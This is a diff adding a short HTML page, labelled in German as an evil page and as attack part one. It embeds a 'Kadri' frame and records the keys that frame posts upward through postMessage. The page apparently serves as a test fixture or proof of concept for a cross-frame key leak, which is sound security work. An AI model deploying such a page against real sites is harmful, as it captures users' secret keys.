@@ -1,0 +1,5 @@
+<!doctype html><html><head><title>Böse Seite</title></head><body style="margin:0">
+<!-- Angriff, Teil 1: eine Seite bettet ein Kadri-Fenster ein und liest dessen Nachrichten nach oben mit (samt Schlüssel) -->
+<iframe id=f src="frame_vid.html" style="width:100%;height:260px;border:0"></iframe>
+<script>window.__keys = []; addEventListener('message', (e) => { if (e.data && e.data.__evpFrame1 && e.data.k) window.__keys.push(e.data.k); });</script>
+</body></html>
